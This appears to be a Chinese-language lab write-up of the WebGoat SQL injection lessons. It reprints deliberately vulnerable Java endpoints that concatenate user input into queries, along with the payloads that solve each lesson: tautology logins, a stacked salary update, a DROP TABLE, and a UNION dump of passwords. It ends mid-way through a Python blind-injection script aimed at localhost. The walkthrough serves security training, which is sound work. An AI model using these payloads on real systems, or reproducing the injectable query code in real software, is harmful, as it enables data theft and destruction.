![image-20220907185247380](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907185247380.png)

#### SqlInjectionLesson5

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.PostConstruct;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint5-1", "SqlStringInjectionHint5-2", "SqlStringInjectionHint5-3", "SqlStringInjectionHint5-4"})
public class SqlInjectionLesson5 extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionLesson5(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }

    @PostConstruct
//    @PostConstruct注解的方法在项目启动的时候执行这个方法，也可以理解为在spring容器启动的时候执行，可作为一些数据的常规化加载，比如数据字典之类的。
    public void createUser() {
        try (Connection connection = dataSource.getConnection()) {
            try (var statement = connection.prepareStatement("create user unauthorized_user password test")){
//                postgresql 创建一个 unauthorized_user 用户密码为 test
                statement.execute();
            }
        }catch (Exception e){
//              user already exists continue
        }
    }


    @PostMapping("/SqlInjection/attack5")
    @ResponseBody
    public AttackResult completed(String query){
        createUser();
        return injectableQuery(query);

    }
    protected AttackResult injectableQuery(String query){
        try(Connection connection = dataSource.getConnection()) {
            try (Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY)){
                statement.executeQuery(query);
                if (checkSolution(connection)){
                    return success(this).build();
                }
                return failed(this).output("Your query was: "+ query).build();
            }

        } catch (Exception e) {
            return failed(this).output(this.getClass().getName()+ " : " + e.getMessage() + "<br> Your query was: "+ query ).build();
        }
    }
    private boolean checkSolution(Connection connection){
        try {
            var stmt = connection.prepareStatement("select  * from information_schema.table_privileges where table_name = ? and grantee = ?");
//          查询是否有权限
            stmt.setString(1,"GRANT_RIGHTS");
            stmt.setString(2,"UNAUTHORIZED_USER");
            var resultSet = stmt.executeQuery();
            return resultSet.next();
        } catch (SQLException e) {
            return false;
        }
    }


}
```

这里是进行权限的授予

```
grant all privileges on grant_rights to unauthorized_user
```

![image-20220907200019144](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907200019144.png)

#### SqlInjectionLesson5a

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint5a1"})
public class SqlInjectionLesson5a extends AssignmentEndpoint {
    private static final String EXPLANATION = "<br> Explanation: This injection works, because <span style=\"font-style: italic\">or '1' = '1'</span> "
            + "always evaluates to true (The string ending literal for '1 is closed by the query itself, so you should not inject it). "
            + "So the injected query basically looks like this: <span style=\"font-style: italic\">SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or TRUE</span>, "
            + "which will always evaluate to true, no matter what came before it.";
    private final LessonDataSource dataSource;

    public SqlInjectionLesson5a(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }

    @PostMapping("/SqlInjection/assignment5a")
    @ResponseBody
    public AttackResult completed(@RequestParam String account, @RequestParam String operator, @RequestParam String injection) {
        return injectableQuery(account + " " + operator + " " + injection);
//        将获取到的三个请求参数进行拼接
    }

    protected AttackResult injectableQuery(String accountName) {
        String query = "";
        try (Connection connection = dataSource.getConnection()) {
            query = "SELECT * FROM user_data where first_name = 'John' and last_name= '" + accountName + "'";
//            查询语句
            try (Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY)) {
                ResultSet results = statement.executeQuery(query);
                if ((results != null) && (results.first())) {
//                    将光标移动到ResultSet对象的第一个
                    ResultSetMetaData resultSetMetaData = results.getMetaData();
//                    检索词对象列的属性
                    StringBuffer output = new StringBuffer();
                    output.append(wirteTable(results, resultSetMetaData));
                    results.last();

                    if (results.getRow() >= 6) {
                        return success(this).feedback("sql-injection.5a.success").output("Your query was: " + query + EXPLANATION).feedbackArgs(output.toString()).build();
                    } else {
                        return failed(this).output(output.toString() + "<br> Your query was: " + query).build();
                    }
                } else {
                    return failed(this).feedback("sql-injection.5a.no.results").output("Your query was: " + query).build();
                }
            }

        } catch (SQLException sqle) {
            return failed(this).output(sqle.getMessage() + "<br> Your query was: " + query).build();
        } catch (Exception e) {
            return failed(this).output(this.getClass().getName() + " : " + e.getMessage() + "<br> Your query was: " + query).build();
        }
    }
    public static String  wirteTable(ResultSet results,ResultSetMetaData resultSetMetaData)throws SQLException{
        int numColumns = resultSetMetaData.getColumnCount();
//        获取列数
        results.beforeFirst();
        StringBuffer t = new StringBuffer();
        t.append("<p>");
        if (results.next()){
            for (int i =1;i<(numColumns + 1);i++){
                t.append(resultSetMetaData.getColumnName(i));
                t.append(", ");
            }
            t.append("<br />");
            results.beforeFirst();
            while (results.next()){
                for (int i = 1;i<(numColumns + 1);i++){
                    t.append(results.getString(i));
                    t.append(", ");
                }
                t.append("<br />");
            }
        }else {
            t.append("Query Successful;however no data was returned from this query.");
        }
        t.append("</p>");
        return (t.toString());
    }

}
```

![image-20220908100816364](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908100816364.png)

简单的一个万能密码

![image-20220908100907161](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908100907161.png)

#### SqlInjectionLesson5b

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.sql.*;

import static java.sql.ResultSet.TYPE_SCROLL_INSENSITIVE;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint5b1", "SqlStringInjectionHint5b2", "SqlStringInjectionHint5b3", "SqlStringInjectionHint5b4"})
public class SqlInjectionLesson5b extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionLesson5b(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }
    @PostMapping("/SqlInjection/assignment5b")
    @ResponseBody
    public AttackResult completed(@RequestParam String userid, @RequestParam String login_count, HttpServletRequest request)throws IOException{
        return injectalbeQuery(login_count,userid);
    }

    protected AttackResult injectalbeQuery(String login_count, String userid) {
        String queryString = "SELECT * FROM user_data WHERE Login_Count = ? and userid = "+userid;
//        这里只进行了一个 字符的预编译
        try (Connection connection = dataSource.getConnection()){
            PreparedStatement query = connection.prepareStatement(queryString,TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_UPDATABLE);
            int count = 0;
            try {
                count = Integer.parseInt(login_count);
//                将预编译语句类型规定为int 并传入 login_count参数
            }catch (Exception e){
                return failed(this).output("Could not parse: "+login_count + " to a number" + "<br> Your query was: "+queryString.replace("?",login_count)).build();
            }
            query.setInt(1,count);
//            将参数添加到sql语句中
            try {
                ResultSet results = query.executeQuery();
                if ((results != null)&& (results.first() == true)){
                    ResultSetMetaData resultSetMetaData = results.getMetaData();
                    StringBuffer output = new StringBuffer();

                    output.append(SqlInjectionLesson5a.wirteTable(results,resultSetMetaData));
                    results.last();
                    if (results.getRow() >= 6){
                        return success(this).feedback("sql-injection.5b.success").output("You query was: "+queryString.replace("?",login_count)).feedbackArgs(output.toString()).build();
                    }else {
                        return failed(this).output(output.toString() + "<br> Your query was: "+ queryString.replace("?",login_count)).build();
                    }
                }else {
                    return failed(this).feedback("sql-injection.5b.no.results").output("Your query was: "+queryString.replace("?",login_count)).build();
                }

            }catch (SQLException sqle){
                return failed(this).output(sqle.getMessage() + "<br> Your query was: "+ queryString.replace("?",login_count)).build();
            }
        }catch (Exception e){
            return failed(this).output(this.getClass().getName()+" : "+e.getMessage() + "<br> Your query was: "+ queryString.replace("?",login_count)).build();
        }
    }

}
```

操作差不多

```
1 or 1=1
```

![image-20220908122215280](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908122215280.png)

#### SqlInjectionLesson8

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;
import java.text.SimpleDateFormat;
import java.util.Calendar;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint.8.1", "SqlStringInjectionHint.8.2", "SqlStringInjectionHint.8.3", "SqlStringInjectionHint.8.4", "SqlStringInjectionHint.8.5"})
public class SqlInjectionLesson8 extends AssignmentEndpoint {

    private final LessonDataSource dataSource;
    public SqlInjectionLesson8(LessonDataSource dataSource){
        this.dataSource = dataSource;
    }
    @PostMapping("/SqlInjection/attack8")
    @ResponseBody
    public AttackResult completed(@RequestParam String name,@RequestParam String auth_tan){
        return injectableQueryConfidentiality(name,auth_tan);
    }
    protected AttackResult injectableQueryConfidentiality(String name,String auth_tan){
        StringBuffer output = new StringBuffer();
        String query = "SELECT * FROM employees WHERE last_name = '" + name + "'AND auth_tan = '"+auth_tan + "'";
        try(Connection connection = dataSource.getConnection()){
            try {
                Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
                log(connection,query);
                ResultSet results= statement.executeQuery(query);
                if (results.getStatement() != null){
                    if (results.first()){
                        output.append(generateTable(results));
                        results.last();

                        if (results.getRow() > 1){
//                        超过一条记录
                            return success(this).feedback("sql-injection.8.success").output(output.toString()).build();
                        }else {
//                            只有一条记录
                            return failed(this).feedback("sql-injection.8.one").output(output.toString()).build();
                        }
                    }else {
//                        没有结果
                        return failed(this).feedback("sql-injection.8.no.results").build();
                    }

                }else {
                    return failed(this).build();
                }
            }catch (SQLException e){
                return failed(this).output("<br><span class='feedback-negative'>" + e.getMessage()+"</span>").build();
            }
        }catch (Exception e){
            return failed(this).output("<br><span class='feedback-negative'>"+e.getMessage()+"</span>").build();
        }
    }



    public static String generateTable(ResultSet results)throws SQLException{
        ResultSetMetaData  resultSetMetaData = results.getMetaData();
//        检索数据库中的数据
        int numColumns = resultSetMetaData.getColumnCount();
//        获取其中的列数
        results.beforeFirst();
//        将光标移动到第一行前面
        StringBuilder table = new StringBuilder();
//
        table.append("<table>");
        if (results.next()){
//          如果结果集中存在值
            table.append("<tr>");
            for (int i = 1; i < (numColumns + 1);i ++ ){
//                进行计数输出
                table.append("<tr>" + resultSetMetaData.getColumnName(i) + "</th>");
            }
            table.append("</tr>");
            results.beforeFirst();
//            这里也是重新回到第一个
            while (results.next()){
                table.append("<tr>");
                for (int i = 1;i< (numColumns + 1); i++ ){
//                    这里是对数据库中查到的数据进行输出
                    table.append("<td>" + results.getString(i) + "</td>");
                }
                table.append("</tr>");
            }
        }else {
            table.append("Query Successful; however no data was returned form this query.");

        }
        table.append("</table>");
        return (table.toString());
    }
    public static void log(Connection connection,String action){
        action =action.replace('\'','"');
        Calendar cal = Calendar.getInstance();
//        用于获取当前时间
        SimpleDateFormat sdf = new SimpleDateFormat("yyy-MM-dd HH:mm:ss");
//        进行时间格式化
        String time = sdf.format(cal.getTime());
        String logQuery = "INSERT INTO access_log (time,action) VALUES ('"+time+"','"+action+"')";
        try{
            Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_UPDATABLE);
            statement.executeUpdate(logQuery);
//                    CONCUR_UPDATABLE 能用结果集更新表中数据
        } catch (SQLException e) {
            System.err.print(e.getMessage());
//            有颜色的输出 报错专用
        }

    }
}
```

```
' or '1'='1' --+ 
```

![image-20220908122832409](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908122832409.png)

#### SqlInjectionLesson9

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint.9.1", "SqlStringInjectionHint.9.2", "SqlStringInjectionHint.9.3", "SqlStringInjectionHint.9.4", "SqlStringInjectionHint.9.5"})
public class SqlInjectionLesson9 extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionLesson9(LessonDataSource dataSource){
        this.dataSource = dataSource;
    }
    @PostMapping("/SqlInjection/attack9")
    @ResponseBody
    public AttackResult completed(@RequestParam String name,@RequestParam String auth_tan){
        return injectableQueryIntegrity(name,auth_tan);
    }
    protected AttackResult injectableQueryIntegrity(String  name,String auth_tan){
        StringBuffer output = new StringBuffer();
        String query = "SELECT * FROM employees WHERE last_name = '"+ name + "' AND auth_tan = '" + auth_tan +"'";
        try(Connection connection = dataSource.getConnection()){
            try{
                Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_UPDATABLE);
//                注意这里是更新语句
                SqlInjectionLesson8.log(connection,query);
                ResultSet resultSet = statement.executeQuery(query);
                var test = resultSet.getRow() != 0;
                if (resultSet.getStatement() != null){
                    if (resultSet.first()){
                        output.append(SqlInjectionLesson8.generateTable(resultSet));
                    }else {
                        return failed(this).feedback("sql-injection.8.no.results").build();
                    }
                }
            }catch (SQLException e){
                System.err.println(e.getMessage());
                return failed(this).output("<br><span class='feedback-negative'>" + e.getMessage() + "</span>").build();
            }
            return checkSalaryRanking(connection,output);
        }catch (Exception e){
            System.err.println(e.getMessage());
            return failed(this).output("<br><span class='feedback-negative'>"+e.getMessage()+"</span>").build();
        }
    }
    private AttackResult checkSalaryRanking(Connection connection,StringBuffer output){
        try {
            String query = "SELECT * FROM employees ORDER BY salary DESC";
            try (Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_UPDATABLE)){
                ResultSet resultSet = statement.executeQuery(query);
                resultSet.first();
//                这里游标到达第一个
                if ((resultSet.getString(2).equals("John"))&& (resultSet.getString(3).equals("Smith"))){
//                    这里就是检测结果first_name是不是 John last_name是不是 Smith
                    output.append(SqlInjectionLesson8.generateTable(resultSet));
                    return success(this).feedback("sql-injection.9.success").output(output.toString()).build();
                }else {
                    return failed(this).feedback("sql-injection.9.one").output(output.toString()).build();
                }

            }
        }catch (SQLException e){
            return failed(this).output("<br><span class='feedback-negative'>"+e.getMessage()+"</span>").build();
        }
    }
}

```

简单堆叠注入

```
Smith';update employees set salary='83000000' where auth_tan='3SL99A' -- +
```

![image-20220908131946425](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908131946425.png)

#### SqlInjectionLesson10

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint.10.1", "SqlStringInjectionHint.10.2", "SqlStringInjectionHint.10.3", "SqlStringInjectionHint.10.4", "SqlStringInjectionHint.10.5", "SqlStringInjectionHint.10.6"})
public class SqlInjectionLesson10 extends AssignmentEndpoint {
    private final LessonDataSource dataSource;


    public SqlInjectionLesson10(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }
    @PostMapping("/SqlInjection/attack10")
    @ResponseBody
    public AttackResult completed(@RequestParam String action_string){
        return injectableQueryAvailability(action_string);
    }
    protected AttackResult injectableQueryAvailability(String action){
        StringBuffer output = new StringBuffer();
        String query = "SELECT * FROM access_log WHERE action LIKE '%"+action +"%'";
        try (Connection connection = dataSource.getConnection()){
            try {
                Statement statement= connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
                ResultSet resultSet = statement.executeQuery(query);
                if (resultSet.getStatement() != null){
                    resultSet.first();
                    output.append(SqlInjectionLesson8.generateTable(resultSet));
                    return failed(this).feedback("sql-injection.10.entries").output(output.toString()).build();
                }else {
                    if (tableExists(connection)){
                        return failed(this).feedback("sql-injection.10.entries").output(output.toString()).build();
                    }else {
                        return success(this).feedback("sql-injection.10.success").build();
                    }
                }
            }catch (SQLException e){
                if (tableExists(connection)){
                    return failed(this).output("<span class='feedback-negative'>"+e.getMessage()+"</span><br>"+output.toString()).build();
                }else {
                    return success(this).feedback("sql-injection.10.success").build();
                }
            }

        }catch (Exception e){
            return failed(this).output("<span class='feedback-negative'>"+e.getMessage()+"</span>").build();
        }
    }
    private boolean tableExists(Connection connection){
        try {
            Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
            ResultSet resultSet = statement.executeQuery("SELECT * FROM access_log");
            int cols = resultSet.getMetaData().getColumnCount();
            return (cols > 0);
        }catch (SQLException e){
            String eMessage = e.getMessage();
            if (eMessage.contains("object not found: ACCESS_LOG")){
                return false;
            }else {
                System.err.println(e.getMessage());
                return false;
            }
        }
    }
}
```

删库

```
%'; drop table access_log-- +
```

![image-20220908135904037](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908135904037.png)

### advanced

#### SqlInjectionAdvanced

```java
package com.wanan.webgoat.lessons.sql_injection.advanced;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class SqlInjectionAdvanced extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A3;
    }

    @Override
    public String getTitle() {
        return "2.sql.advanced.title";
    }
}
```

#### SqlInjectionLesson6a

```java
package com.wanan.webgoat.lessons.sql_injection.advanced;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.sql_injection.introduction.SqlInjectionLesson5a;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.xml.transform.Result;
import java.sql.*;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint-advanced-6a-1", "SqlStringInjectionHint-advanced-6a-2", "SqlStringInjectionHint-advanced-6a-3",
        "SqlStringInjectionHint-advanced-6a-4", "SqlStringInjectionHint-advanced-6a-5"})
public class SqlInjectionLesson6a extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionLesson6a(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }
    @PostMapping("/SqlInjectionAdvanced/attack6")
    @ResponseBody
    public AttackResult completed(@RequestParam String userid_6a){
        return injectableQuery(userid_6a);
    }

    public AttackResult injectableQuery(String accountName) {
        String query = "";
        try (Connection connection = dataSource.getConnection()){
            boolean usedUnion = true;
            query = "SELECT * FROM user_data WHERE last_name = '"+accountName +"'";
            if (!accountName.matches("(?i)(^[^-/*;)]*)(\\s*)UNION(.*$)")){
                usedUnion = false;
            }
            try (Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY)){
                ResultSet resultSet = statement.executeQuery(query);
                if ((resultSet != null) && (resultSet.first())){
                    ResultSetMetaData resultSetMetaData = resultSet.getMetaData();
                    StringBuffer output = new StringBuffer();
                    output.append(SqlInjectionLesson5a.wirteTable(resultSet,resultSetMetaData));
                    String appendingWhenSucceded;
                    if (usedUnion)
//                        这里分别表示使用union还是没用
                        appendingWhenSucceded = "Well done! Can you also figure out a solution, by appending a new SQL Statement?";
                    else
                        appendingWhenSucceded = "Well done! Can you also figure out a solution, by using a UNION?";
                    resultSet.last();
                    if (output.toString().contains("dave")&&output.toString().contains("passW0rD")){
//                        这里是通关条件
                        output.append(appendingWhenSucceded);
                        return success(this).feedback("sql-injection.advanced.6a.success").feedbackArgs(output.toString()).output(" Your query was : "+query).build();
                    }else {
                        return failed(this).output(output.toString()+"<br> Your query was : "+query).build();
                    }
                }else {
                    return failed(this).feedback("sql-injection.advanced.6a.no.results").output(" Your query was : " + query).build();
                }

            }catch (SQLException sqle){
                return failed(this).output(sqle.getMessage() + "<br> Your query was : " + query).build();
            }
        }catch (Exception e){
            e.printStackTrace();
            return failed(this).output(this.getClass().getName()+ " : "+e.getMessage() +"<br> Your query was : "+query).build();
        }
    }
}
```

#### SqlInjectionLesson6b

```java
package com.wanan.webgoat.lessons.sql_injection.advanced;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

@RestController
public class SqlInjectionLesson6b extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionLesson6b(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }

    @PostMapping("/SqlInjectionAdvanced/attack6b")
    @ResponseBody
    public AttackResult completed(@RequestParam String userid_6b) throws IOException{
        if (userid_6b.equals(getPassword())){
            return success(this).build();
        }else {
            return failed(this).build();
        }
    }

    protected String getPassword() {
        String password = "dave";
        try(Connection connection = dataSource.getConnection()){
            String query = "SELECT password FROM user_system_data WHERE user_name = 'dave'";
            try {
                Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
                ResultSet resultSet = statement.executeQuery(query);
                if (resultSet != null && resultSet.first()){
                    password = resultSet.getString("password");
                }
            }catch (SQLException sqle){
                sqle.printStackTrace();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    return (password);
    }

}
```

```
' union select 1,'2','3','4',user_name,password,7 from user_system_data  where user_name ='dave'  -- + 
```

![image-20220908153915708](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908153915708.png)

```
';select * from user_system_data -- +
```

![image-20220908155707552](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908155707552.png)

两个框是两个题目

![image-20220908220745492](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908220745492.png)

#### SqlInjectionChallenge

```java
package com.wanan.webgoat.lessons.sql_injection.advanced;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.web.bind.annotation.PutMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@AssignmentHints(value = {"SqlInjectionChallenge1", "SqlInjectionChallenge2", "SqlInjectionChallenge3"})
@Slf4j
public class SqlInjectionChallenge extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionChallenge(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }
    @PutMapping("/SqlInjectionAdvanced/challenge")
    @ResponseBody
    public AttackResult registerNewUser(@RequestParam String username_reg,@RequestParam String email_reg,@RequestParam String password_reg)throws Exception{
        AttackResult attackResult = checkArguments(username_reg,email_reg,password_reg);
        if (attackResult == null){
            try (Connection connection = dataSource.getConnection()){
                String checkUserQuery = "select userid from sql_challenge_users where userid = '" + username_reg + "'";
                Statement statement = connection.createStatement();
                ResultSet resultSet = statement.executeQuery(checkUserQuery);
                if (resultSet.next()){
                    if (username_reg.contains("tom'")){
//                        如果 查到了 这个tom' 就成功
                        attackResult = success(this).feedback("user.exists").build();
                    }else {
                        attackResult = failed(this).feedback("user.exists").feedbackArgs(username_reg).build();
                    }
                } else {
//                    如果没这个 用户名 就插入
                    PreparedStatement preparedStatement = connection.prepareStatement("INSERT INTO sql_challenge_users VALUE (?,?,?)");
                    preparedStatement.setString(1,username_reg);
                    preparedStatement.setString(2,email_reg);
                    preparedStatement.setString(3,password_reg);
                    attackResult = success(this).feedback("user.created").feedbackArgs(username_reg).build();
                }
            }catch (SQLException e){
                attackResult = failed(this).output("Something went wrong").build();
            }
        }
        return attackResult;
    }

    private AttackResult checkArguments(String username_reg, String email_reg, String password_reg) {
        if (StringUtils.isEmpty(username_reg) || StringUtils.isEmpty(email_reg) || StringUtils.isEmpty(password_reg)){
            return failed(this).feedback("input.invalid").build();
        }
        if (username_reg.length() > 250 || email_reg.length() > 30 || password_reg.length()>30){
            return failed(this).feedback("input.invalid").build();
        }
        return null;
    }
}
```

#### SqlInjectionChallengeLogin

```java
package com.wanan.webgoat.lessons.sql_injection.advanced;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;


@RestController
@AssignmentHints(value = {"SqlInjectionChallengeHint1", "SqlInjectionChallengeHint2", "SqlInjectionChallengeHint3", "SqlInjectionChallengeHint4"})
public class SqlInjectionChallengeLogin extends AssignmentEndpoint {

    private final LessonDataSource dataSource;

    public SqlInjectionChallengeLogin(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }

    @PostMapping("/SqlInjectionAdvanced/challenge_Login")
    @ResponseBody
    public AttackResult login(@RequestParam String username_login, @RequestParam String password_login) throws Exception {
        try (var connection = dataSource.getConnection()) {
            var statement = connection.prepareStatement("select password from sql_challenge_users where userid = ? and password = ?");
            statement.setString(1, username_login);
            statement.setString(2, password_login);
            var resultSet = statement.executeQuery();

            if (resultSet.next()) {
                return ("tom".equals(username_login)) ? success(this).build()
                        : failed(this).feedback("ResultsButNotTom").build();
            } else {
                return failed(this).feedback("NoResultsMatched").build();
            }
        }
    }
}
```

![image-20220908175309466](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908175309466.png)

简单测试下

![image-20220908180524928](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908180524928.png)

![image-20220908180530962](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908180530962.png)

简单写一下注入脚本

查数据库 通过更改 offset 0 可进行其他数据库获取

```python
import time

import requests

url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge"

header = {
"Cookie":"JSESSIONID=OQWQI54foDP-s9R5KQOXYulZsHMkc8k9F0iCEOEZ; XDEBUG_SESSION=XDEBUG_ECLIPSE; csrftoken=K3MAIhCJRXpvtFDEZL8jPBZBaqB4AQUx5URfXIFuNrZf1FouXjtMPTz8kZT9dpf3; rememberMe=K6J1EzKLEEGRyRq4Dk4GSgMqUEoPYPnI7K2GhLNeSk50azVUvwTHQdT78dE6ZMM0V+2xcbpWgT9m+SALVMYHt7ai6bMTERfZMAU2lHViA6IP4AyXh0eaLyzi0Gc9Va0epahdl6lvGna8/0DgSX1/YIqwFMQ7QFaCAAP1LtE/jkE3TQdk7UNBdvpfHWlMSOgZdJZoYhIGxBhnGJxCVX9E+vB3fcILABQBDKvFpYhlGMNl5LMSA+SyBZCCzGpz2e3MgljifDFgNbSmcwVCfFdGc32h78OWzTcZOCbYbOav2Lp5q7960r2iSNZnaI+aX7xDklYgEgxlL6Q6xtZihscVODPiG9Rcy95G9OsQlLfPycpmS8bYcBrvt3Go0lfFcrGY2Uo6vDxj67hj/73f0VpdgWRfXnk0VPSL9uxElbqjx3GAEU2uKf657Uc3e/DpiVsMwovQUIFTDsm78NdL/E6+ONXKCTHcXp+Vym+6ItYGTKlLvfdZwg9D5JXHrtMjwZJz"
}
passwd = ""
i = 0
while True:
    i +=1
    for  c in range(32,127):
        # 数据库
        # payload =  f"' or CASE substr((select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA),{i},1) WHEN '{chr(c)}' THEN true ELSE false END-- "
        # 表
